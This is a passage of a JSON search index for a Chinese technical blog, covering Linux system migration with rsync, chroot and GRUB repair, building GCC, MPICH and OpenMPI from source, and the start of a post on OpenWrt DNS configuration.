<li>\u4e0d\u4ece\u6839\u76ee\u5f55\u5f00\u59cb\uff0c\u5219\u4f1a\u6392\u9664\u6240\u6709\u540c\u540d\u7684\u76ee\u5f55</li> </ul> </li> <li>\u5751\uff1a\u5982\u679c--exclude\u53ea\u7528\u4e8e\u6392\u9664\u4e00\u4e2a\u9879\u7684\u8bdd\uff0c\u4e0d\u8981\u7528\u82b1\u62ec\u53f7\u3002</li> <li>\u6709\u65e0\u659c\u7ebf\uff1asrc dst/\u8868\u793a\u5c06src\u76ee\u5f55\u81ea\u8eab\u590d\u5236\u5230dst\u76ee\u5f55\u4e0b\uff0csrc/ dst/\u5219\u5c06src\u76ee\u5f55\u4e0b\u5185\u5bb9\u590d\u5236\u5230dst\u76ee\u5f55\u4e0b</li> <li>\u5efa\u8bae\u4f7f\u7528 --dry-run\u5148\u770b\u770b\u4f1a\u590d\u5236\u4ec0\u4e48</li> </ul> <p>\u5efa\u8bae\u9605\u8bfbman rsync\u4e0b\u9762\u4e24\u4e2a\u90e8\u5206</p> <p>INCLUDE/EXCLUDE PATTERN RULES</p> <p>ANCHORING INCLUDE/EXCLUDE PATTERNS</p> <pre><code>ANCHORING INCLUDE/EXCLUDE PATTERNS\n       As mentioned earlier, global include/exclude patterns are anchored at the \"root of the transfer\" (as opposed to per-directory patterns, which are\n       anchored  at  the  merge-file's  directory).  If you think of the transfer as a subtree of names that are being sent from sender to receiver, the\n       transfer-root is where the tree starts to be duplicated in the destination directory.  This root governs where  patterns  that  start  with  a  /\n       match.\n\n       Because the matching is relative to the transfer-root, changing the trailing slash on a source path or changing your use of the --relative option\n       affects the path you need to use in your matching (in addition to changing how much of the file tree is duplicated on the destination host).  The\n       following examples demonstrate this.\n\n       Let's  say  that  we want to match two source files, one with an absolute path of \"/home/me/foo/bar\", and one with a path of \"/home/you/bar/baz\".\n       Here is how the various command choices differ for a 2-source transfer:\n\n           Example cmd: rsync -a /home/me /home/you /dest\n           +/- pattern: /me/foo/bar\n           +/- pattern: /you/bar/baz\n           Target file: /dest/me/foo/bar\n           Target file: /dest/you/bar/baz\n\n           Example cmd: rsync -a /home/me/ /home/you/ /dest\n           +/- pattern: /foo/bar               (note missing \"me\")\n           +/- pattern: /bar/baz               (note missing \"you\")\n           Target file: /dest/foo/bar\n           Target file: /dest/bar/baz\n\n           Example cmd: rsync -a --relative /home/me/ /home/you /dest\n           +/- pattern: /home/me/foo/bar       (note full path)\n           +/- pattern: /home/you/bar/baz      (ditto)\n           Target file: /dest/home/me/foo/bar\n           Target file: /dest/home/you/bar/baz\n\n           Example cmd: cd /home; rsync -a --relative me/foo you/ /dest\n           +/- pattern: /me/foo/bar      (starts at specified path)\n           +/- pattern: /you/bar/baz     (ditto)\n           Target file: /dest/me/foo/bar\n           Target file: /dest/you/bar/baz\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#mount-efi","title":"mount EFI","text":"<p>\u4e4b\u540e\u9700\u8981\u4fee\u6539efi\u5206\u533a\uff0c\u5148\u5c06\u5206\u533a\u6302\u8f7d\u5230\u5907\u4efd\u7cfb\u7edf\u5bf9\u5e94\u76ee\u5f55</p> <pre><code>sudo mount /dev/nvme0np1 /mnt/ubuntu/boot/efi\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#chroot","title":"chroot","text":"<p>chroot\u540e\u65b0\u7684\u8fdb\u7a0b\u4ee5\u53ca\u5b50\u8fdb\u7a0b\u90fd\u53ea\u80fd\u8bbf\u95ee\u65b0\u7684\u6839\u6587\u4ef6\u7cfb\u7edf\u5185\u7684\u6587\u4ef6\u3002\u4e0d\u77e5\u9053chroot\u88ab\u53d1\u660e\u7684\u539f\u672c\u76ee\u7684\u662f\u4ec0\u4e48\uff0c\u4f46\u662f\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5207\u6362\u5230\u5907\u4efd\u7684\u7cfb\u7edf\u4e2d\uff0c\u8fdb\u884c\u4fee\u6539\u3002</p> <pre><code>sudo chroot /mnt/ubuntu\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#mount-procsys-etc","title":"mount proc,sys etc","text":"<p>\u5728chroot\u7684\u7cfb\u7edf\u4e2d\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5426\u5219\u65e0\u6cd5\u6267\u884c\u7a0b\u5e8f\u4ee5\u53ca\u4e00\u4e9b\u64cd\u4f5c\uff0c\u66f4\u5177\u4f53\u7684\u4f5c\u7528\u8fd8\u4e0d\u6e05\u695a\u3002</p> <pre><code>sudo su\ncd /mnt/arch # or where you are preparing the chroot dir\nmount -t proc /proc proc/\nmount --rbind /sys sys/\nmount --rbind /dev dev/\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u4fee\u590dfstab","title":"\u4fee\u590dfstab","text":"<p>\u4fee\u6539fstab\u6587\u4ef6\u4e2d\u6839\u76ee\u5f55\u548cEFI\u76ee\u5f55\u6302\u8f7d\u70b9\u8bbe\u5907\u7684UUID\u4e3a\u65b0\u56fa\u6001\u7684UUID</p> <pre><code>sudo vim /etc/fstab\n</code></pre> <ul> <li>\u901a\u8fc7blkid\u67e5\u770bUUID</li> </ul> <pre><code>blkid\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u4fee\u590dgrub","title":"\u4fee\u590dgrub","text":"<pre><code>root@ubuntu:/boot# update-grub\n\nSourcing file `/etc/default/grub'\nSourcing file `/etc/default/grub.d/init-select.cfg'\nGenerating grub configuration file ...\nFound linux image: /boot/vmlinuz-5.19.0-35-generic\nFound initrd image: /boot/initrd.img-5.19.0-35-generic\nFound linux image: /boot/vmlinuz-5.19.0-32-generic\nFound initrd image: /boot/initrd.img-5.19.0-32-generic\nMemtest86+ needs a 16-bit boot, that is not available on EFI, exiting\nWarning: os-prober will not be executed to detect other bootable partitions.\nSystems on them will not be added to the GRUB boot configuration.\nCheck GRUB_DISABLE_OS_PROBER documentation entry.\nAdding boot menu entry for UEFI Firmware Settings ...\ndone\n</code></pre> <p>\u6b64\u6b65\u9aa4\u4f1a\u68c0\u6d4blinux image, initrd image\u7684\u4f4d\u7f6e\uff0c\u4fee\u6539<code>/boot/grub/grub.cfg</code>\u83dc\u5355\u9879\u3002</p> <p>\u5982\u679c\u9047\u5230 <pre><code>EFI variables are not supported on this system.\n</code></pre> 1. \u9000\u51fachroot 2. load efi filesystem    <pre><code>modprobe efivarfs\n</code></pre> 3. \u8fdb\u5165chroot, mount the efi filesystem    <pre><code>mount -t efivarfs efivarfs /sys/firmware/efi/efivars\n</code></pre> 4. \u9a8c\u8bc1    <pre><code>ls /sys/firmware/efi\n</code></pre></p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u5b89\u88c5grub\u5230efi\u5206\u533a","title":"\u5b89\u88c5grub\u5230EFI\u5206\u533a","text":"<pre><code>grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB\n</code></pre> <p>\u4f1a\u5728/boot/efi\u4e0b\u521b\u5efa <pre><code>root@ubuntu:/boot/efi# grub-install\nInstalling for x86_64-efi platform.\nInstallation finished. No error reported.\n\n\nroot@ubuntu:/boot/efi# tree .\n.\n\u2514\u2500\u2500 EFI\n    \u251c\u2500\u2500 BOOT\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 BOOTX64.EFI\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 fbx64.efi\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 mmx64.efi\n    \u2514\u2500\u2500 ubuntu\n        \u251c\u2500\u2500 BOOTX64.CSV\n        \u251c\u2500\u2500 grub.cfg\n        \u251c\u2500\u2500 grubx64.efi\n        \u251c\u2500\u2500 mmx64.efi\n        \u2514\u2500\u2500 shimx64.efi\n</code></pre></p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u542f\u52a8\u8fdb\u5165grub\u547d\u4ee4\u884c","title":"\u542f\u52a8\u8fdb\u5165grub\u547d\u4ee4\u884c","text":"<p>\u521a\u5f00\u59cb\u91cd\u542f\u540e\uff0c\u4f1a\u8fdb\u5165grub&gt;\u547d\u4ee4\u884c\uff0c\u800c\u975egrub\u83dc\u5355\u3002\u641c\u7d22\u540e\u77e5\u9053\u8fd9\u662fgrub\u6ca1\u6709\u627e\u5230grub.cfg\u6587\u4ef6\uff08\u4f46\u662f\u660e\u660e\u662f\u6709\u7684\uff09</p> <p>When you boot up your system and it stops at the <code>grub&gt;</code> prompt, that is the full GRUB 2 command shell.  That means GRUB 2 started normally and loaded the <code>normal.mod</code> module (and other modules which are located in <code>/boot/grub/[arch]/</code>), but it didn\u2019t find your <code>grub.cfg</code> file. If you see <code>grub rescue&gt;</code> that means it couldn\u2019t find <code>normal.mod</code>, so it probably couldn\u2019t find any of your boot files.</p> <p>\u53ef\u4ee5\u624b\u52a8\u5f15\u5bfc\u8fdb\u5165\u7cfb\u7edf</p> <ol> <li>\u627e\u5230\u7cfb\u7edf\u4f4d\u7f6e\u3002\u53ef\u4ee5\u901a\u8fc7ls\u77e5\u9053\u6709\u54ea\u4e9b\u78c1\u76d8\u548c\u5206\u533a\u3002\u7136\u540e\u518d\u901a\u8fc7\u5217\u51fa\u76ee\u5f55\u5185\u5bb9\u5224\u65ad\uff0c\u5982</li> </ol> <pre><code>ls (hdd1,gpt5)/\n</code></pre> <ol> <li>\u8bbe\u7f6eprefix\uff0croot</li> </ol> <pre><code>set prefix=(hd1,gpt5)/boot/grub\nset root=(hd1,gpt5)/\n</code></pre> <ol> <li>\u542f\u52a8</li> </ol> <pre><code>normal\n</code></pre> <p>\u8fdb\u5165\u7cfb\u7edf\u540e\u518d\u91cd\u65b0\u4fee\u590dgrub</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li> <p>\u4f7f\u7528tar\u8fc1\u79fb\u7cfb\u7edf\uff1ahttps://rovo98.github.io/posts/3babee60/#%E8%BF%81%E7%A7%BB%E7%B3%BB%E7%BB%9F</p> </li> <li> <p>\u542f\u52a8\u8fdb\u5165grub cmdline\uff1a</p> </li> <li>https://unix.stackexchange.com/questions/329926/grub-starts-in-command-line-after-reboot</li> <li>https://www.linuxfoundation.org/blog/classic-sysadmin-how-to-rescue-a-non-booting-grub-2-on-linux/</li> </ul>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/","title":"gcc mpi\u6e90\u7801\u7f16\u8bd1","text":"<p>gcc mpi\u6e90\u7801\u7f16\u8bd1\u8fc7\u7a0b\u8bb0\u5f55</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#gcc","title":"GCC","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u4e0b\u8f7d\u6e90\u7801","title":"\u4e0b\u8f7d\u6e90\u7801","text":"<ul> <li>\u5b98\u65b9GNU Mirror List - GNU Project - Free Software Foundation</li> <li>https://ftp.gnu.org/gnu/</li> <li> <p>http://ftp.gnu.org/gnu/</p> </li> <li> <p>\u56fd\u5185\u955c\u50cf</p> </li> <li>https://mirrors.aliyun.com/gnu/</li> <li>https://mirrors.ustc.edu.cn/gnu/</li> <li>https://mirrors.tuna.tsinghua.edu.cn/gnu/</li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#configure","title":"Configure","text":"<p>\u6ce8\u610f\uff1a</p> <ul> <li>\u4e0d\u80fd\u5728src\u76ee\u5f55configure\uff0c\u800c\u662f\u5e94\u8be5\u53e6\u5916\u521b\u5efa\u4e00\u4e2abuild\u76ee\u5f55</li> <li>gcc\u63d0\u4f9b\u4e86\u4f9d\u8d56\u5b89\u88c5\u811a\u672c\uff0c\u4e0d\u7528\u624b\u52a8\u53bb\u4e0b\u8f7d</li> </ul> <pre><code>cd /tmp/dir\nwget https://mirrors.ustc.edu.cn/gnu/gcc/gcc-8.5.0/gcc-8.5.0.tar.xz\ntar xf gcc-8.5.0.tar.xz\ncd gcc-8.5.0\n#\u5b89\u88c5\u4f9d\u8d56\n./contrib/download_prerequisites\n\n#\u5728build\u76ee\u5f55\u4e0bconfigure\ncd ..\nmkdir build\ncd build\n\n../gcc-8.5.0/configure --disable-multilib --prefix=$HOME/ENV/gcc-8.5.0 --enable-languages=c,c++\n\nmake -j 2&gt;&amp;1 |tee make.log  #32\u7ebf\u7a0b\u7f16\u8bd1\u5927\u698240\u5206\u949f\u5de6\u53f3\nmake install\n</code></pre> <ul> <li>--disable-multilib\uff1agcc\u9ed8\u8ba4\u652f\u6301\u7f16\u8bd132\u4f4d\u7a0b\u5e8f(-m32)\uff0c\u5173\u95ed\u6b64\u529f\u80fd</li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u89e3\u51b3\u94fe\u63a5\u5e93\u9519\u8bef","title":"\u89e3\u51b3\u94fe\u63a5\u5e93\u9519\u8bef","text":"<p>\u539f\u56e0\uff0c\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684\u3002\u8fd0\u884c\u65f6\u4f7f\u7528\u7684\u662f\u7cfb\u7edf\u7684\u5e93\u3002\u800c\u7cfb\u7edf\u7684\u5e93\u548c\u7f16\u8bd1\u65f6\u4f7f\u7528\u7684\u5e93\u4e0d\u517c\u5bb9\u3002</p> <ul> <li>\u65b9\u6cd5\u4e00\uff1a\u4fee\u6539<code>LD_LIBRARY_PATH</code>\u73af\u5883\u53d8\u91cf</li> </ul> <pre><code>export LD_LIBRARY_PATH=$HOME/opt/gcc-9.1.0/lib64\n</code></pre> <ul> <li>\u65b9\u6cd5\u4e8c\uff1a\u7f16\u8bd1\u65f6\u5c06\u5e93\u641c\u7d22\u8def\u5f84\u5b58\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d</li> </ul> <pre><code>~/opt/gcc-9.1.0/bin/g++ -Wl,-rpath=$HOME/opt/gcc-9.1.0/lib64 --std=c++17 demo.cc -o demo\n</code></pre> <ul> <li>\u65b9\u6cd5\u4e09\uff1a\u9759\u6001\u94fe\u63a5</li> </ul> <pre><code>~/opt/gcc-9.1.0/bin/g++ --std=c++17 demo.cc -o demo -static-libstdc++ -static-libgcc\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u89e3\u538b\u6e90\u7801\u5f88\u6162","title":"\u89e3\u538b\u6e90\u7801\u5f88\u6162","text":"<p>\u670d\u52a1\u5668\u4e0a\u89e3\u538b60M\u7684\u6e90\u7801\u975e\u5e38\u6162\uff0c\u89e3\u538b\u4e8610-20\u5206\u949f\u3002\u4e0d\u53ea\u662f\u89e3\u538b\uff0ccp, rm\u6e90\u7801\u76ee\u5f55\u90fd\u975e\u5e38\u7684\u6162\u3002\u63a8\u6d4b\u662fNFS\u7684\u539f\u56e0\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\u4e3a\u4f7f\u7528\u672c\u5730\u76ee\u5f55\uff0c\u5982/tmp</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#gcc830-make\u5931\u8d25","title":"gcc8.3.0 make\u5931\u8d25","text":"<p>[Building gcc 8.3 Makefile:955: all] Error 2 - Stack Overflow</p> <p>\u597d\u50cf\u662f8.3.0\u81ea\u8eab\u7684\u95ee\u9898\uff0c\u6362\u75288.5.0\u7f16\u8bd1\u6210\u529f</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpi","title":"MPI","text":"<p>MPI\u7f16\u8bd1\u8f83\u5feb\uff0c\u53ef\u4ee5\u7f16\u8bd1\u5f88\u591a\u7248\u672c\u4f7f\u7528</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpich\u548copenmpi\u5bf9\u6bd4","title":"mpich\u548copenmpi\u5bf9\u6bd4","text":"<p>MPICH\uff1aGuides | MPICH</p> <ul> <li>\u652f\u6301mpi2.0\uff0c\u529f\u80fd\u5f3a\u5927\uff0c\u6548\u7387\u9ad8</li> <li>\u7f3a\u70b9\u662f\u4ec5\u652f\u6301\u4ee5\u592a\u7f51</li> </ul> <p>OpenMPI\uff1a</p> <ul> <li> <p>\u652f\u6301mpi2.0</p> </li> <li> <p>\u5bf9\u4e8eCPU\u6838\u5fc3\u8f83\u591a\u7684\u8282\u70b9\uff0c\u63a8\u8350\u4f7f\u7528 openmpi</p> </li> <li>\u652f\u6301\u5404\u79cd\u7f51\u7edc\uff0c\u5305\u62ec\u4ee5\u592a\u7f51\u548cinfiniband</li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpich","title":"mpich","text":"<ul> <li>\u53c2\u8003\u5b98\u65b9\u6587\u6863\uff1ampich-4.0.2-installguide.pdf</li> </ul> <pre><code>../configure -prefix=$HOME/ENV/mpich-4.0.2-static CC=gcc CXX=g++ --disable-fortran --enable-fast=all,O3 --with-ucx=embedded --disable-shared --enable-static\n</code></pre> <ul> <li> <p>--disable-fortran</p> </li> <li> <p>\u6587\u6863\u91cc\u5199\u7684\u662f--disable-f77\uff1a\u7981\u7528fortran 77\uff0c--disable-fc\uff1a\u7981\u7528Fortran 90\uff08\u53ca\u4e4b\u540e95, 2003, 2008\u7248\u672c\uff09\u4f46\u662f\u5c1d\u8bd5\u540e\u65e0\u6548\uff0c\u4ecd\u7136\u4f1a\u8981\u6c42\u4f60\u6709fortran\u7f16\u8bd1\u5668\u3002</p> </li> <li> <p>--enable-fast</p> </li> </ul> <p>MPICH libraries are built with default compiler optimization, -O2, which can be modified by --enable-fast configure option. For instance, --disable-fast disables the default optimization option. --enable-fast=O sets default compiler optimization as -O <ul> <li>--enable-shared</li> <li>mpicc\u7f16\u8bd1\u51fa\u6765\u7684\u7a0b\u5e8f\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u8fd0\u884c\u65f6\u9700\u8981\u8bbe\u7f6e<code>LD_LIBRARY_PATH</code>\u3002</li> <li>--disable-shared --enable-static\u5219\u4e0d\u7528\u8bbe\u7f6e<code>LD_LIBRARY_PATH</code></li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#process-manger","title":"Process Manger","text":"<ul> <li>--with-pm=hydra</li> </ul> <p>MPICH has been designed to work with multiple process managers; that is, although you can start MPICH jobs with mpiexec, there are different mechanisms by which your processes are started. An interface (called PMI) isolates the MPICH library code from the process manager. Currently three process managers are distributed with MPICH</p> <ul> <li>hydra This is the default process manager that natively uses the existing daemons on the system such as ssh, slurm, pbs.</li> <li>gforker This is a simple process manager that creates all processes on a single machine. It is useful both for debugging and for running on shared memory multiprocessors.</li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u9047\u5230\u7684\u95ee\u9898_1","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#ucx-version","title":"UCX version","text":"<p>configure: error: UCX installation does not meet minimum version requirement (v1.9.0). Please upgrade your installation, or use --with-ucx=embedded</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpirun\u591a\u8282\u70b9\u5361\u4f4f","title":"mpirun\u591a\u8282\u70b9\u5361\u4f4f","text":"<p>\u6362\u7528--disable-shared --enable-static\u7f16\u8bd1\uff0c\u7ed3\u679c\u7f16\u8bd1\u9519\u8bef</p> <pre><code>/usr/bin/ld: /tmp/yfy/build-mpi/modules/ucx/src/ucm/.libs/libucm.a(libucm_la-event.o): in function `ucm_event_install':\n/tmp/yfy/build-mpi/modules/ucx/src/ucm/../../../../../mpich-4.0.2/modules/ucx/src/ucm/event/event.c:536: undefined reference to `ucs_load_modules'\ncollect2: error: ld returned 1 exit status\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#openmpi","title":"openmpi","text":"<ul> <li>4.7. configure command line options \u2014 Open MPI 5.0.x documentation (open-mpi.org)</li> </ul> <pre><code>../openmpi-4.1.4/configure --prefix=$HOME/ENV/openmpi-4.1.4 --disable-mpi-fortran CC=gcc CXX=g++\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u8fd0\u884c\u9009\u9879","title":"\u8fd0\u884c\u9009\u9879","text":"<pre><code>-v  verbose\n-q  quiet\n--use-hwthread-cpus     #\u4f7f\u7528\u7269\u7406\u6838\u4f5c\u4e3aslot\u6570\u76ee\n\n-H, -host, --host &lt;host1,host2,...,hostN&gt;\n-hostfile, --hostfile &lt;hostfile&gt;\n    % cat myhostfile\n    aa slots=2\n    bb slots=2\n    cc slots=2\n\n-c, -n, --n, -np &lt;#&gt;\n-cpus-per-proc, --cpus-per-proc &lt;#perproc&gt;\n-bind-to-core, --bind-to-core\n-bind-to-socket, --bind-to-socket\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u9047\u5230\u7684\u95ee\u9898_2","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#run","title":"run","text":"<pre><code>\u279c  workspace mpirun -n 4 ./mpi_hello\n--------------------------------------------------------------------------\nBy default, for Open MPI 4.0 and later, infiniband ports on a device\nare not used by default.  The intent is to use UCX for these devices.\nYou can override this policy by setting the btl_openib_allow_ib MCA parameter\nto true.\n\n  Local host:              snode0\n  Local adapter:           mlx5_0\n  Local port:              1\n\n--------------------------------------------------------------------------\n--------------------------------------------------------------------------\nWARNING: There was an error initializing an OpenFabrics device.\n\n  Local host:   snode0\n  Local device: mlx5_0\n--------------------------------------------------------------------------\nHello world from processor snode0, rank 3 out of 4 processors\nHello world from processor snode0, rank 0 out of 4 processors\nHello world from processor snode0, rank 1 out of 4 processors\nHello world from processor snode0, rank 2 out of 4 processors\n[snode0:2773927] 3 more processes have sent help message help-mpi-btl-openib.txt / ib port not selected\n[snode0:2773927] Set MCA parameter \"orte_base_help_aggregate\" to 0 to see all help / error messages\n[snode0:2773927] 3 more processes have sent help message help-mpi-btl-openib.txt / error in device init\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/","title":"openwrt DNS\u8be6\u89e3","text":"","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#openwrt-dns\u8bf4\u660e","title":"openwrt DNS\u8bf4\u660e","text":"<p>\u53c2\u8003\uff1a - [OpenWrt Wiki] DNS and DHCP configuration /etc/config/dhcp - [OpenWrt Wiki] DNS and DHCP examples</p> <ul> <li>openwrt DNS\u548cDHCP\u914d\u7f6e\u5747\u4f4d\u4e8e/etc/config/dhcp</li> <li>openwrt\u4f7f\u7528dnsmasq\u548codhcpd\u3002\u5b83\u4eec\u529f\u80fd\u5982\u4e0b\uff1a</li> </ul> <p></p> <ul> <li>\u603b\u7ed3\u6765\u8bf4\uff1a</li> <li>dnsmasq\u5c06\u81ea\u5df1\u8bbe\u7f6e\u4e3aDHCP\u5ba2\u6237\u7aef\u7684DNS</li> <li>dnsmasq\u4f7f\u7528\u7f13\u5b58\u6765\u63d0\u5347\u6027\u80fd\u3002\u5230\u8fbe\u7684dns\u8bf7\u6c42\u5982\u679c\u6ca1\u6709\u547d\u4e2d\u5219\u8f6c\u53d1\u7ed9\u4e0a\u6e38DNS <p>Dnsmasq serves as a downstream caching DNS server advertising itself to DHCP clients. This allows better performance and management of DNS functionality on your local network. Every received DNS query not currently in cache is forwarded to the upstream DNS servers.</p> </li> </ul>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u8bbe\u7f6ednsmasq\u4e0a\u6e38dns","title":"\u8bbe\u7f6ednsmasq\u4e0a\u6e38DNS","text":"<ul> <li>openwrt\u9ed8\u8ba4\u4f7f\u7528peer dns\u4f5c\u4e3a\u4e0a\u6e38\u7684dns\uff0c\u901a\u5e38\u7531ISP\u4e0a\u6e38DHCP\u670d\u52a1\u5668\u63d0\u4f9b</li> <li>dnsmasq\u5b9a\u671f\u67e5\u8be2\u6240\u6709\u7684dns(resolver)\uff0c\u5e76\u4f7f\u7528\u6700\u5feb\u7684\u4e00\u4e2a</li> <li>\u591adns provider</li> <li>\u66f4\u80fd\u5bb9\u5fcdDoS\u653b\u51fb</li> <li>\u4e0d\u540c\u7684DNS\u7531\u4e8e\u7f13\u5b58\u3001\u540c\u6b65\u3001\u8d1f\u8f7d\u5747\u8861\u53ef\u80fd\u8fd4\u56de\u4e0d\u540c\u7684\u7ed3\u679c\u3002\u4e3a\u4e86\u533a\u5206\u6b63\u786e\u7ed3\u679c\uff0c\u9700\u8981\u4f7f\u7528DNSSEC\uff0c\u53ef\u80fd\u4f1a\u5bf9\u6027\u80fd\u9020\u6210\u635f\u5bb3\u3002     &gt; To distinguish between correct and incorrect answers such as false-negatives, you need to utilize DNSSEC which may negatively impact fault tolerance and performance.</li> </ul>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u67e5\u770b\u4e0a\u6e38dns","title":"\u67e5\u770b\u4e0a\u6e38dns","text":"<pre><code>$ cat /tmp/resolv.conf.d/resolv.conf.auto\n# Interface wan\nnameserver 192.168.33.1\nsearch lan\n# Interface wan6\nnameserver 